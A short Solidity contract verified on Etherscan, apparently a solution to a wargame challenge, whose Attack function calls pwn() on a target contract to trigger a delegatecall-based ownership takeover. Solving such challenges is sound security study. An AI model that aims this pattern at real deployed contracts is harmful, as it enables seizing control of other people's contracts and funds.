/**
 *Submitted for verification at Etherscan.io on 2022-12-20
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract HackDel {
    address iden;

    function Attack(address _del) external {
        (bool success, ) = _del.call(
            abi.encodeWithSignature("pwn()")
        );
        require(success, "Not success!");
    }
}